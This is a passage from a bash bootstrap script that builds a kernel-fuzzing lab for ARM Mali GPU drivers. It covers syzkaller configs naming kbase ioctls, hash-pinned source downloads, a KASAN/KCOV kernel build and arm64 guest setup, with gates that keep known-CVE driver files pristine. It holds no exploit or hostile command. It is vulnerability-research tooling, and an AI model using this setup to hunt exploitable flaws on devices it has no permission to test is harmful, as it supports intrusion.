    "ioctl$KBASE_IOCTL_MEM_JIT_INIT_10_2",
    "ioctl$KBASE_IOCTL_MEM_JIT_INIT_11_5",
    "ioctl$KBASE_IOCTL_MEM_PROFILE_ADD",
    "ioctl$KBASE_IOCTL_MEM_QUERY",
    "ioctl$KBASE_IOCTL_MEM_SYNC",
    "ioctl$KBASE_IOCTL_POST_TERM",
    "ioctl$KBASE_IOCTL_SET_FLAGS",
    "ioctl$KBASE_IOCTL_SOFT_EVENT_UPDATE",
    "ioctl$KBASE_IOCTL_STICKY_RESOURCE_MAP",
    "ioctl$KBASE_IOCTL_STICKY_RESOURCE_UNMAP",
    "ioctl$KBASE_IOCTL_STREAM_CREATE",
    "ioctl$KBASE_IOCTL_TLSTREAM_ACQUIRE",
    "ioctl$KBASE_IOCTL_TLSTREAM_FLUSH",
    "ioctl$KBASE_IOCTL_VERSION_CHECK",
    "ioctl$KBASE_IOCTL_VERSION_CHECK_RESERVED",
    "mmap$bifrost",
    "munmap$bifrost",
    "openat$bifrost",
    "openat$mali"
  ]
}
__PL_30__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/syz-r28p0-phase-f.cfg" "6e6e55bf2291a367fb80b2f5ae167f37b578204b572998bf6b96ed4652a6d11a"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/syz-r41p0-phase-e.cfg")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/syz-r41p0-phase-e.cfg" <<'__PL_31__'
# syz-manager config — Phase E: release-matched fuzzing of r41p0-01eac0 (JM) kbase
# Kernel: lab-owned 4.19.320 NO_MALI build (Phase C), descriptions: in-lab syzkaller
# copy with sys/linux/dev_mali_r41p0.txt (release-exact, const-cross-checked).
# Read-only reuse: syz-builder.cpio / empty.img / syz-host.key from A-mali fuzz dir.
# sandbox=none: kernel has no CONFIG_USER_NS.
{
  "target": "linux/amd64",
  "syzkaller": "/home/za0x/kern_research/mali-uaf-lab/fuzzing/syzkaller/syzkaller-r41p0",
  "http": "127.0.0.1:56745",
  "workdir": "/home/za0x/kern_research/mali-uaf-lab/fuzzing/syzkaller/workdir-r41p0",
  "kernel_obj": "/home/za0x/kern_research/mali-uaf-lab/builds/linux-4.19.320-r41p0",
  "kernel_src": "/home/za0x/kern_research/mali-uaf-lab/builds/linux-4.19.320-r41p0",
  "image": "/home/za0x/Desktop/A-mali_kernel/qemu/fuzz/empty.img",
  "sshkey": "/home/za0x/Desktop/A-mali_kernel/qemu/fuzz/syz-host.key",
  "ssh_user": "root",
  "procs": 1,
  "sandbox": "none",
  "cover": true,
  "type": "qemu",
  "vm": {
    "count": 1,
    "cpu": 2,
    "mem": 2048,
    "kernel": "/home/za0x/kern_research/mali-uaf-lab/builds/linux-4.19.320-r41p0/arch/x86/boot/bzImage",
    "initrd": "/home/za0x/Desktop/A-mali_kernel/qemu/fuzz/syz-builder.cpio",
    "cmdline": "console=ttyS0 panic=-1 nokaslr"
  },
  "enable_syscalls": [
    "ioctl$KBASE_HWCNT_READER_CLEAR",
    "ioctl$KBASE_HWCNT_READER_DISABLE_EVENT",
    "ioctl$KBASE_HWCNT_READER_DUMP",
    "ioctl$KBASE_HWCNT_READER_ENABLE_EVENT",
    "ioctl$KBASE_HWCNT_READER_GET_API_VERSION",
    "ioctl$KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES",
    "ioctl$KBASE_HWCNT_READER_GET_BUFFER",
    "ioctl$KBASE_HWCNT_READER_GET_BUFFER_SIZE",
    "ioctl$KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES",
    "ioctl$KBASE_HWCNT_READER_GET_HWVER",
    "ioctl$KBASE_HWCNT_READER_PUT_BUFFER",
    "ioctl$KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES",
    "ioctl$KBASE_HWCNT_READER_SET_INTERVAL",
    "ioctl$KBASE_IOCTL_CONTEXT_PRIORITY_CHECK",
    "ioctl$KBASE_IOCTL_DISJOINT_QUERY",
    "ioctl$KBASE_IOCTL_FENCE_VALIDATE",
    "ioctl$KBASE_IOCTL_GET_CONTEXT_ID",
    "ioctl$KBASE_IOCTL_GET_CPU_GPU_TIMEINFO",
    "ioctl$KBASE_IOCTL_GET_DDK_VERSION",
    "ioctl$KBASE_IOCTL_GET_GPUPROPS",
    "ioctl$KBASE_IOCTL_HWCNT_READER_SETUP",
    "ioctl$KBASE_IOCTL_HWCNT_SET",
    "ioctl$KBASE_IOCTL_JOB_SUBMIT",
    "ioctl$KBASE_IOCTL_KINSTR_JM_FD",
    "ioctl$KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO",
    "ioctl$KBASE_IOCTL_KINSTR_PRFCNT_SETUP",
    "ioctl$KBASE_IOCTL_MEM_ALIAS",
    "ioctl$KBASE_IOCTL_MEM_ALLOC",
    "ioctl$KBASE_IOCTL_MEM_COMMIT",
    "ioctl$KBASE_IOCTL_MEM_EXEC_INIT",
    "ioctl$KBASE_IOCTL_MEM_FIND_CPU_OFFSET",
    "ioctl$KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET",
    "ioctl$KBASE_IOCTL_MEM_FLAGS_CHANGE",
    "ioctl$KBASE_IOCTL_MEM_FREE",
    "ioctl$KBASE_IOCTL_MEM_IMPORT",
    "ioctl$KBASE_IOCTL_MEM_JIT_INIT",
    "ioctl$KBASE_IOCTL_MEM_PROFILE_ADD",
    "ioctl$KBASE_IOCTL_MEM_QUERY",
    "ioctl$KBASE_IOCTL_MEM_SYNC",
    "ioctl$KBASE_IOCTL_POST_TERM",
    "ioctl$KBASE_IOCTL_SET_FLAGS",
    "ioctl$KBASE_IOCTL_SET_LIMITED_CORE_COUNT",
    "ioctl$KBASE_IOCTL_SOFT_EVENT_UPDATE",
    "ioctl$KBASE_IOCTL_STICKY_RESOURCE_MAP",
    "ioctl$KBASE_IOCTL_STICKY_RESOURCE_UNMAP",
    "ioctl$KBASE_IOCTL_STREAM_CREATE",
    "ioctl$KBASE_IOCTL_TLSTREAM_ACQUIRE",
    "ioctl$KBASE_IOCTL_TLSTREAM_FLUSH",
    "ioctl$KBASE_IOCTL_VERSION_CHECK",
    "ioctl$KBASE_IOCTL_VERSION_CHECK_RESERVED",
    "mmap$bifrost",
    "munmap$bifrost",
    "openat$bifrost",
    "openat$mali"
  ]
}
__PL_31__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/syz-r41p0-phase-e.cfg" "f9135140d7c0f2f5ddfc5537c233d9d74f4fd69f2c36e3817f3f2316ee205dd1"

  log "payloads: all written and hash-verified"
}

# =============================== STAGE: PREREQS ==============================
stage_prereqs() {
  log "=== stage prereqs (ARCH=$ARCH) ==="
  local missing=() pkgs=()
  for c in gcc g++ make flex bison bc cpio gzip xz curl git python3 patch rsync \
           timeout file strings nm ssh-keygen; do
    command -v "$c" >/dev/null 2>&1 || missing+=("$c")
  done
  # arch-conditional tools: guest qemu, cross toolchain, DTB tooling (arm64)
  local arch_tools=(qemu-system-x86_64)
  if [ "$ARCH" = arm64 ]; then
    arch_tools=(qemu-system-aarch64 aarch64-linux-gnu-gcc aarch64-linux-gnu-g++ dtc fdtget)
  fi
  for c in "${arch_tools[@]}"; do
    command -v "$c" >/dev/null 2>&1 || missing+=("$c")
  done
  # package-name mapping for --install-prereqs
  for m in "${missing[@]+"${missing[@]}"}"; do
    case "$m" in
      qemu-system-x86_64)     pkgs+=("qemu-system-x86");;
      qemu-system-aarch64)    pkgs+=("qemu-system-arm");;
      aarch64-linux-gnu-gcc)  pkgs+=("gcc-aarch64-linux-gnu");;
      aarch64-linux-gnu-g++)  pkgs+=("g++-aarch64-linux-gnu");;
      dtc|fdtget)             pkgs+=("device-tree-compiler");;
      ssh-keygen)             pkgs+=("openssh-client");;
      *) pkgs+=("$m");;
    esac
  done
  if [ "${#missing[@]}" -gt 0 ]; then
    if [ "$INSTALL_PREREQS" = 1 ]; then
      log "installing missing packages: ${pkgs[*]}"
      sudo apt-get update -qq
      sudo apt-get install -y --no-install-recommends "${pkgs[@]}" build-essential \
        libssl-dev libelf-dev
    else
      fail "missing tools: ${missing[*]} — rerun with --install-prereqs or install manually"
    fi
  fi
  gate "prereqs: toolchain complete (ARCH=$ARCH)" bash -c \
    "for c in gcc g++ make flex bison bc cpio python3 git curl ${arch_tools[*]}; do command -v \$c >/dev/null || exit 1; done"

  # accelerator detection (arm64 guests only run KVM on aarch64 hosts)
  if [ "$ARCH" = arm64 ] && [ "$(uname -m)" != aarch64 ]; then
    QEMU_ACCEL="tcg"; note "QEMU accel: TCG (arm64 guest on $(uname -m) host)"
  elif [ -w /dev/kvm ]; then QEMU_ACCEL="kvm"; note "QEMU accel: kvm"; else
    QEMU_ACCEL="tcg"; note "QEMU accel: TCG (no /dev/kvm) — boots work, fuzz exec rates ~5-10x slower"; fi
  mkdir -p "$LAB_ROOT/.stamps"
  echo "$QEMU_ACCEL" > "$LAB_ROOT/.stamps/qemu_accel"

  # disk guard: kernel build ~6G, syzkaller+go ~3G, sources ~1G
  local free_kb; free_kb=$(df -Pk "$LAB_ROOT" 2>/dev/null | awk 'NR==2{print $4}' || echo 0)
  if [ "$free_kb" -lt $((14 * 1024 * 1024)) ]; then
    fail "only ${free_kb}K free under $LAB_ROOT — need >=14G for a full run"
  fi
  log "disk guard ok: $((free_kb / 1024 / 1024))G free"
  GATES+=("PASS  prereqs: disk >=14G")
}

# =============================== STAGE: SOURCES ==============================
verify_staging_one() { # <file> <expected-hash> <copy-hint>
  local f="$STAGING_DIR/$1"
  if [ ! -f "$f" ]; then
    fail "staged input missing: $f
  Copy it from the reference host, e.g.:
    scp <refhost>:<path> $STAGING_DIR/
  expected sha256: $2"
  fi
  sha256_pin "$f" "$2"
  log "staging ok: $1"
}

stage_sources() {
  log "=== stage sources ==="
  mkdir -p "$LAB_ROOT"/{downloads,sources/kbase,bin,logs/bootstrap,evidence,.stamps}
  mkdir -p "$STAGING_DIR"

  # --- staged (non-downloadable) inputs: verify the ones this run needs ---
  # busybox-x86_64 only for x86_64 guests (arm64 busybox is cross-built
  # from the pinned busybox-1.38.0 source below)
  [ "$ARCH" = x86_64 ] && verify_staging_one "busybox-x86_64" "$H_BUSYBOX"
  verify_staging_one "syz-builder.cpio" "$H_SYZCPIO"
  verify_staging_one "syz-host.key" "$H_SYZKEY"
  verify_staging_one "empty.img" "$H_EMPTYIMG"

  # --- driver archives: staged-first, download fallback (hash-pinned when
  # the download name matches the staged archive, else TOFU + soft gate) ---
  local dv url base darc
  for dv in $DRIVER_VERSION $(echo "${WITH_DRIVERS:-}" | tr ',' ' '); do
    [ -n "$dv" ] || continue
    darc=$(drv_archive "$dv")
    if [ -f "$STAGING_DIR/$darc" ]; then
      verify_staging_one "$darc" "$(drv_hash "$dv")"
      continue
    fi
    url=$(drv_url "$dv"); base=$(basename "$url")
    local dl="$LAB_ROOT/downloads/$base"
    note "staged $darc missing — download fallback from developer.arm.com"
    if [ ! -f "$dl" ]; then
      curl -fSL -o "$dl" "$url" || fail "driver download failed: $url
  Downloading the ARM Mali driver requires an ARM developer account.
  Copy it from the reference host, e.g.:
    scp <refhost>:/path/to/$darc $STAGING_DIR/
  expected sha256: $(drv_hash "$dv")"
    fi
    if [ "$base" = "$darc" ]; then
      sha256_pin "$dl" "$(drv_hash "$dv")"
      GATES+=("PASS  sources: $darc download hash-pinned")
      # usable stand-in for the staged file: hardlink into staging
      ln -f "$dl" "$STAGING_DIR/$darc" 2>/dev/null || cp -n "$dl" "$STAGING_DIR/$darc"
    else
      # URL basename != staged archive (e.g. valhall VX… vs staged AX…):
      # hash unpinned by design — record provenance
      gate_soft "sources: $base download recorded (TOFU — name differs from staged archive)" test -s "$dl"
      sha256sum "$dl" > "$dl.sha256"
      ln -f "$dl" "$STAGING_DIR/$darc" 2>/dev/null || cp -n "$dl" "$STAGING_DIR/$darc"
    fi
  done

  # --- kernel tarball (hash-pinned per known version; kernel.org) ---
  local KH
  case "$KERNEL_VERSION" in
    4.19.320) KH="$H_KERNEL";;
    5.10.30)  KH="$H_KERNEL_510";;
    *)        KH="";;
  esac
  local ktx="$LAB_ROOT/downloads/linux-$KERNEL_VERSION.tar.xz"
  if [ ! -f "$ktx" ]; then
    log "downloading kernel $KERNEL_VERSION..."
    curl -fSL -o "$ktx" "$KERNEL_URL_BASE/linux-$KERNEL_VERSION.tar.xz"
  fi
  if [ -n "$KH" ]; then
    sha256_pin "$ktx" "$KH"; GATES+=("PASS  sources: kernel tarball sha256 pinned ($KERNEL_VERSION)")
  else
    gate_soft "sources: kernel tarball sha256 recorded (UNVERIFIED version)" test -s "$ktx"
    sha256sum "$ktx" > "$ktx.sha256"  # record provenance for unknown versions
  fi

  # --- Go toolchain (hash-pinned) ---
  local got="$LAB_ROOT/downloads/go1.27.1.linux-amd64.tar.gz"
  if [ ! -f "$got" ]; then
    log "downloading Go 1.27.1..."
    curl -fSL -o "$got" "$GO_TARBALL_URL"
  fi
  sha256_pin "$got" "$H_GO"
  if [ ! -x "$LAB_ROOT/toolchains/go/bin/go" ]; then
    mkdir -p "$LAB_ROOT/toolchains"
    tar -C "$LAB_ROOT/toolchains" -xzf "$got"
  fi
  gate "sources: go toolchain go1.27.1" bash -c "\"$LAB_ROOT/toolchains/go/bin/go\" version | grep -q 'go1.27.1'"

  # --- syzkaller vendor clone (pinned commit) ---
  if [ ! -d "$SZ/.git" ]; then
    log "cloning syzkaller @$SYZ_COMMIT ..."
    git clone --quiet "$SYZ_GIT_URL" "$SZ"
  fi
  git -C "$SZ" checkout --quiet "$SYZ_COMMIT"
  gate "sources: syzkaller at pinned commit" bash -c "[ \"\$(git -C '$SZ' rev-parse HEAD)\" = '$SYZ_COMMIT' ]"

  # --- arm64 guest userspace sources (hash-pinned; cross-built in kernel stage) ---
  if [ "$ARCH" = arm64 ]; then
    local bt="$LAB_ROOT/downloads/busybox-1.38.0.tar.bz2"
    if [ ! -f "$bt" ]; then
      log "downloading busybox-1.38.0..."
      curl -fSL -o "$bt" "https://busybox.net/downloads/busybox-1.38.0.tar.bz2"
    fi
    sha256_pin "$bt" "$H_BUSYBOX_SRC"; GATES+=("PASS  sources: busybox-1.38.0 source sha256 pinned")
    local dbt="$LAB_ROOT/downloads/dropbear-2026.94.tar.bz2"
    if [ ! -f "$dbt" ]; then
      log "downloading dropbear-2026.94..."
      curl -fSL -o "$dbt" "https://matt.ucc.asn.au/dropbear/releases/dropbear-2026.94.tar.bz2"
    fi
    sha256_pin "$dbt" "$H_DROPBEAR"; GATES+=("PASS  sources: dropbear-2026.94 source sha256 pinned")
  fi

  # --- unpack pristine driver sources (never written to after this) ---
  local arch src_tar
  for dv in $DRIVER_VERSION $(echo "${WITH_DRIVERS:-}" | tr ',' ' '); do
    [ -n "$dv" ] || continue
    [ -d "$(drv_src "$dv")/driver" ] && continue
    src_tar="$STAGING_DIR/$(drv_archive "$dv")"
    log "unpacking pristine driver $dv"
    mkdir -p "$(drv_src "$dv")"
    case "$src_tar" in
      *.tar.gz) tar -C "$(drv_src "$dv")" -xzf "$src_tar";;
      *)        tar -C "$(drv_src "$dv")" -xf "$src_tar";;
    esac
    gate "sources: $dv pristine tree has midgard Kbuild" \
      bash -c "find '$(drv_src "$dv")' -name Kbuild -path '*drivers/gpu/arm/midgard*' | head -1 | grep -q ."
  done
  set_stamp sources "$KERNEL_VERSION|$(echo "$DRIVER_VERSION ${WITH_DRIVERS:-}" | tr ' ' ',')"
}

# =============================== STAGE: KERNEL ===============================
apply_gcc_compat() { # kernel-4.19 gcc>=14 fixes (C5/C6), idempotent
  ( cd "$KT" && patch -p1 --forward --batch <<'EOF_GCC_COMPAT' || true
--- a/arch/x86/Makefile
+++ b/arch/x86/Makefile
@@ -41,6 +41,7 @@
 REALMODE_CFLAGS += $(call __cc-option, $(CC), $(REALMODE_CFLAGS), -Wno-address-of-packed-member)
 REALMODE_CFLAGS += $(call __cc-option, $(CC), $(REALMODE_CFLAGS), $(cc_stack_align4))
 REALMODE_CFLAGS += $(CLANG_FLAGS)
+REALMODE_CFLAGS += $(call __cc-option, $(CC), $(REALMODE_CFLAGS), -std=gnu89)
 export REALMODE_CFLAGS
 
 # BITS is used as extension for files which are available in a 32 bit
--- a/arch/x86/boot/compressed/Makefile
+++ b/arch/x86/boot/compressed/Makefile
@@ -27,6 +27,7 @@
 	vmlinux.bin.xz vmlinux.bin.lzo vmlinux.bin.lz4
 
 KBUILD_CFLAGS := -m$(BITS) -O2
+KBUILD_CFLAGS += $(call cc-option, -std=gnu89)
 KBUILD_CFLAGS += -fno-strict-aliasing $(call cc-option, -fPIE, -fPIC)
 KBUILD_CFLAGS += -DDISABLE_BRANCH_PROFILING
 cflags-$(CONFIG_X86_32) := -march=i386
EOF_GCC_COMPAT
  )
}

# prep one driver version into a working source dir (pristine -> patched copy)
prep_driver_src() { # <ver> → $LAB_ROOT/builds/driver_src/<ver>
  local ver="$1" short; short=$(drv_short "$ver")
  local work="$LAB_ROOT/builds/driver_src/$short"
  if drv_needs_patch "$ver"; then
    rm -rf "$work"; mkdir -p "$work"
    cp -a "$(drv_src "$ver")/." "$work/"
    log "applying bring-up patch (NO_MALI x86 dummy model) to $short"
    patch -d "$work" -p1 --forward --batch < "$LAB_ROOT/patches/v_r28_malimodels.patch" \
      > "$LAB_ROOT/logs/bootstrap/patch_$short.log" 2>&1 \
      || grep -q "previously applied" "$LAB_ROOT/logs/bootstrap/patch_$short.log" \
      || fail "bring-up patch failed for $short (see logs/bootstrap/patch_$short.log)"
    # Phase F provenance gate: the CVE files must be untouched by the patch
    local f
    for f in mali_kbase_mem.c mali_kbase_mem_linux.c mali_kbase_core_linux.c; do
      gate "driver $short: CVE file $f byte-identical to pristine (patch does not touch it)" \
        bash -c "diff -q \"\$(find '$(drv_src "$ver")' -name $f | head -1)\" \"\$(find '$work' -name $f | head -1)\" >/dev/null"
    done
  else
    rm -rf "$work"; mkdir -p "$work"
    cp -a "$(drv_src "$ver")/." "$work/"
  fi
  echo "$work"
}

stage_kernel() {
  log "=== stage kernel ($KERNEL_VERSION, ARCH=$ARCH, DRIVER_MODE=$DRIVER_MODE, MALI_MODE=$MALI_MODE) ==="
  local kkey="$KERNEL_VERSION|$ARCH|$DRIVER_MODE|$DRIVER_VERSION|$MALI_MODE|${WITH_DRIVERS:-}"
  local mk=(make -C "$KT")
  [ -n "$CROSS_COMPILE" ] && mk+=(CROSS_COMPILE="$CROSS_COMPILE")
  if need_run kernel "$kkey"; then
    mkdir -p "$KT"
    tar -C "$KT" --strip-components=1 -xJf "$LAB_ROOT/downloads/linux-$KERNEL_VERSION.tar.xz"
    if [ "$KERNEL_VERSION" = "4.19.320" ] && [ "$ARCH" = x86_64 ]; then
      apply_gcc_compat
      gate "kernel: gcc>=14 compat patch applied" \
        bash -c "grep -q 'std=gnu89' '$KT/arch/x86/Makefile' && grep -q 'std=gnu89' '$KT/arch/x86/boot/compressed/Makefile'"
    fi
    # arm64@5.10 needs no x86 gcc-compat patch (validated natively); the
    # x86@5.10 build is blocked by validate_config (patches_for_virtual_device)

    # stage the first driver into the tree so the ONE kernel build produces
    # the image (+ Module.symvers and, in module mode, the first .ko)
    integrate_driver_tree "$DRIVER_VERSION"

    # --- config: 4.19 = the validated lab config; 5.x = defconfig + fragment
    if [ "$KERNEL_VERSION" = "4.19.320" ]; then
      cp "$LAB_ROOT/configs/lab_fuzz.config" "$KT/.config"
      if [ "$DRIVER_MODE" = module ]; then
        sed -i 's/^CONFIG_MALI_MIDGARD=y/CONFIG_MALI_MIDGARD=m/' "$KT/.config"
      fi
    else
      "${mk[@]}" ARCH="$KARCH" defconfig >/dev/null
      cat "$LAB_ROOT/configs/lab_fuzz_510.config" >> "$KT/.config"
      # arch/mode adjustments on top of the fragment (fragment documents them)
      if [ "$DRIVER_MODE" = builtin ]; then
        sed -i 's/^CONFIG_MALI_MIDGARD=m/CONFIG_MALI_MIDGARD=y/' "$KT/.config"
      fi
      if [ "$ARCH" = x86_64 ]; then
        sed -i 's/^CONFIG_MALI_PLATFORM_NAME="devicetree"/CONFIG_MALI_PLATFORM_NAME="vexpress"/' "$KT/.config"
      fi
      if [ "$MALI_MODE" = csf ]; then
        # last-wins append beats the fragment's not-set line (verified)
        printf 'CONFIG_MALI_CSF_SUPPORT=y\n' >> "$KT/.config"
      fi
    fi
    "${mk[@]}" ARCH="$KARCH" olddefconfig >/dev/null
    if [ "$DRIVER_MODE" = module ]; then
      gate "kernel: CONFIG_MALI_MIDGARD=m" grep -q '^CONFIG_MALI_MIDGARD=m' "$KT/.config"
    else
      gate "kernel: CONFIG_MALI_MIDGARD=y" grep -q '^CONFIG_MALI_MIDGARD=y' "$KT/.config"
    fi
    gate "kernel: KASAN/KCOV enabled" bash -c "grep -q '^CONFIG_KASAN=y' '$KT/.config' && grep -q '^CONFIG_KCOV=y' '$KT/.config'"
    gate "kernel: IKCONFIG_PROC (config.gz in guest)" grep -q '^CONFIG_IKCONFIG_PROC=y' "$KT/.config"
    # CSF gate: symbol must exist AND be =y only in csf mode (it vanishes
    # entirely when builtin — depends on MALI_MIDGARD=m)
    if [ "$MALI_MODE" = csf ]; then
      gate "kernel: CONFIG_MALI_CSF_SUPPORT=y (MALI_MODE=csf)" grep -q '^CONFIG_MALI_CSF_SUPPORT=y' "$KT/.config"
    else
      gate "kernel: CONFIG_MALI_CSF_SUPPORT off (MALI_MODE=jm)" \
        bash -c "! grep -q '^CONFIG_MALI_CSF_SUPPORT=y' '$KT/.config'"
    fi
    gate "kernel: MALI_PLATFORM_NAME devicetree (arm64)" \
      bash -c "[ '$ARCH' != arm64 ] || grep -q '^CONFIG_MALI_PLATFORM_NAME=\"devicetree\"' '$KT/.config'"

    log "building kernel once (-j$KERNEL_JOBS, ARCH=$ARCH) — this is the only full kernel build"
    "${mk[@]}" ARCH="$KARCH" -j"$KERNEL_JOBS" > "$LAB_ROOT/logs/bootstrap/kernel_build.log" 2>&1 \
      || { tail -30 "$LAB_ROOT/logs/bootstrap/kernel_build.log"; fail "kernel build failed (logs/bootstrap/kernel_build.log)"; }
    gate "kernel: $KIMG_REL built" test -f "$KT/$KIMG_REL"
    sha256sum "$KT/$KIMG_REL" > "$LAB_ROOT/evidence/kimage.sha256"
    log "kimage: $(cat "$LAB_ROOT/evidence/kimage.sha256")"
    # module-mode Module.symvers for downstream .ko builds
    [ "$DRIVER_MODE" = module ] && gate "kernel: Module.symvers present" test -f "$KT/Module.symvers"
    set_stamp kernel "$kkey"
  else
    log "kernel tree present, reusing built image"
  fi
  gate "kernel: image built ($KIMG_REL)" test -f "$KT/$KIMG_REL"

  # --- arm64: DTB with the guide's mali gpu node (CONFIG_OF=y → kbase uses
  # module_platform_driver; without a DT gpu node there is no /dev/mali0) ---
  if [ "$ARCH" = arm64 ]; then
    build_arm64_dtb
  fi
  # --- arm64 userspace: static busybox + dropbear cross builds (staged
  # x86 binaries cannot run in the arm64 guests) ---
  if [ "$ARCH" = arm64 ]; then
    build_arm64_userspace
  fi
}

# qemu-virt base DTB → insert the guide's mali gpu node → validate with fdtget
build_arm64_dtb() {
  local img="$LAB_ROOT/images"; mkdir -p "$img"
  local stamp="$img/.dtb_stamp"
  local want="virt,$KERNEL_VERSION,gic-virt"
  if [ "$FORCE" != 1 ] && [ -f "$stamp" ] && [ "$(cat "$stamp")" = "$want" ] \
     && [ -f "$img/virt_mali.dtb" ]; then
    log "DTB present, reusing $img/virt_mali.dtb"
  else
    log "dumping qemu-virt base DTB and inserting mali gpu node"
    rm -f "$img/virt_base.dtb"
    qemu-system-aarch64 -machine virt,virtualization=on,gic-version=max \
      -m 2048 -machine "dumpdtb=$img/virt_base.dtb" >/dev/null 2>&1 \
      || fail "qemu dumpdtb failed (qemu-system-aarch64)"
    gate "dtb: qemu virt base dtb dumped" test -s "$img/virt_base.dtb"
    dtc -I dtb -O dts "$img/virt_base.dtb" -o "$img/virt_base.dts" >/dev/null 2>&1 \
      || fail "dtc dtb→dts failed"
    python3 "$LAB_ROOT/scripts/make_arm64_dtb.py" "$img/virt_base.dts" "$img/virt_mali.dts" \
      || fail "make_arm64_dtb.py failed (insert gpu node)"
    dtc -I dts -O dtb "$img/virt_mali.dts" -o "$img/virt_mali.dtb" >/dev/null 2>&1 \
      || fail "dtc dts→dtb failed"
    printf '%s' "$want" > "$stamp"
  fi
  # hard gates on the node content (guide values; fdtget prints cells
  # without leading zeros)
  gate "dtb: gpu node present with guide reg" \
    bash -c "[ \"\$(fdtget -t x '$img/virt_mali.dtb' /gpu@0d000000 reg 2>/dev/null)\" = '0 d000000 0 200000' ]"
  gate "dtb: gpu node has 3 guide interrupts (168 level-high)" \
    bash -c "[ \"\$(fdtget -t x '$img/virt_mali.dtb' /gpu@0d000000 interrupts 2>/dev/null | tr '\\n' ' ')\" = '0 a8 4 0 a8 4 0 a8 4 ' ]"
  gate "dtb: gpu node compatible matches r36p0 kbase_dt_ids" \
    bash -c "[ \"\$(fdtget -t s '$img/virt_mali.dtb' /gpu@0d000000 compatible 2>/dev/null)\" = 'arm,mali-midgard' ]"
  sha256sum "$img/virt_mali.dtb" > "$LAB_ROOT/evidence/virt_mali.dtb.sha256"
}

# cross-build static busybox + dropbear for arm64 guests (hash-pinned
# sources from stage_sources); stamped, idempotent
build_arm64_userspace() {
  local tc="$LAB_ROOT/toolchains/arm64"; mkdir -p "$tc"
  local cross="aarch64-linux-gnu-"
  if [ ! -x "$tc/busybox" ] || [ ! -x "$tc/dropbear" ] || [ ! -x "$tc/dropbearkey" ]; then
    log "cross-building busybox-1.38.0 + dropbear-2026.94 (static aarch64)"
    # busybox: defconfig + CONFIG_STATIC=y
    if [ ! -d "$LAB_ROOT/sources/busybox-1.38.0" ]; then
      mkdir -p "$LAB_ROOT/sources/busybox-1.38.0"
      tar -C "$LAB_ROOT/sources/busybox-1.38.0" --strip-components=1 -xjf \
        "$LAB_ROOT/downloads/busybox-1.38.0.tar.bz2"
    fi
    local bx="$LAB_ROOT/sources/busybox-1.38.0"
    make -C "$bx" ARCH=arm64 CROSS_COMPILE="$cross" defconfig >/dev/null
    sed -i 's/^# CONFIG_STATIC is not set/CONFIG_STATIC=y/' "$bx/.config"
    grep -q '^CONFIG_STATIC=y' "$bx/.config" \
      || fail "busybox .config: CONFIG_STATIC not set after sed"
    make -C "$bx" ARCH=arm64 CROSS_COMPILE="$cross" -j"$KERNEL_JOBS" busybox \
      > "$LAB_ROOT/logs/bootstrap/busybox_arm64.log" 2>&1 \
      || { tail -20 "$LAB_ROOT/logs/bootstrap/busybox_arm64.log"; fail "busybox aarch64 build failed"; }
    cp "$bx/busybox" "$tc/busybox"
    gate "userspace: busybox is aarch64 static" \
      bash -c "file '$tc/busybox' | grep -q 'aarch64' && file '$tc/busybox' | grep -q 'statically linked'"
    # dropbear: static daemon + keygen (scp server support is built into the daemon)
    if [ ! -d "$LAB_ROOT/sources/dropbear-2026.94" ]; then
      mkdir -p "$LAB_ROOT/sources/dropbear-2026.94"
      tar -C "$LAB_ROOT/sources/dropbear-2026.94" --strip-components=1 -xjf \
        "$LAB_ROOT/downloads/dropbear-2026.94.tar.bz2"
    fi
    local db="$LAB_ROOT/sources/dropbear-2026.94"
    ( cd "$db" && ./configure --host=aarch64-linux-gnu --disable-zlib \
        CC="${cross}gcc" > /dev/null 2>&1 \
      && make -j"$KERNEL_JOBS" PROGRAMS="dropbear dropbearkey" LDFLAGS="-static" \
        > "$LAB_ROOT/logs/bootstrap/dropbear_arm64.log" 2>&1 ) \
      || { tail -20 "$LAB_ROOT/logs/bootstrap/dropbear_arm64.log" 2>/dev/null; fail "dropbear aarch64 build failed"; }
    cp "$db/dropbear" "$db/dropbearkey" "$tc/"
    gate "userspace: dropbear(+key) are aarch64 static" \
      bash -c "file '$tc/dropbear' | grep -q aarch64 && file '$tc/dropbearkey' | grep -q aarch64"
  fi
  gate "userspace: arm64 busybox+dropbear staged" \
    bash -c "test -x '$tc/busybox' && test -x '$tc/dropbear' && test -x '$tc/dropbearkey'"
}

# place a driver version into the kernel tree — guide-exact full-tree copy
# + idempotent wiring + collision/era gates (never deletes payload layout
# files; stale artifacts from a previous driver are manifested and removed)
integrate_driver_tree() { # <ver>
  local ver="$1" short; short=$(drv_short "$ver")
  local work; work=$(prep_driver_src "$ver")
  local pk; pk=$(find "$work" -type d -path '*driver/product/kernel' | head -1)
  if [ -z "$pk" ]; then
    fail "driver $short: product/kernel not found in prepared tree $work
  Stage the pristine archive and rerun:
    scp <refhost>:<path>/$(drv_archive "$ver") $STAGING_DIR/
  expected sha256: $(drv_hash "$ver")"
  fi
  log "staging driver $short into kernel tree (guide-exact full copy)"

  # collision gate: driver files vs PRISTINE tarball file list (not the
  # staged tree — the tree already contains prior drivers); LC_ALL=C so
  # sort order matches comm's byte-wise comparison
  local lst="$LAB_ROOT/builds/pristine_files_$KERNEL_VERSION.lst"
  if [ ! -f "$lst" ]; then
    tar -tJf "$LAB_ROOT/downloads/linux-$KERNEL_VERSION.tar.xz" \
      | sed 's|^[^/]*/||' | awk '!/\/$/' | LC_ALL=C sort -u > "$lst"
  fi
  local drvlst="$LAB_ROOT/builds/drv_files_$short.lst"
  ( cd "$pk" && find . -type f | sed 's|^\./||' | LC_ALL=C sort ) > "$drvlst"
  LC_ALL=C comm -12 "$drvlst" "$lst" > "$LAB_ROOT/builds/drv_collisions_$short.lst"
  gate "driver $short: 0 path collisions with pristine kernel tree" \
    test ! -s "$LAB_ROOT/builds/drv_collisions_$short.lst"

  # stale artifact manifest: artifacts among driver-owned paths (recorded
  # for evidence before cleanup)
  local stale="$LAB_ROOT/evidence/driver_stale_files.txt"
  : > "$stale"

  # cleanup previous driver's owned paths (cross-era switches must not leak
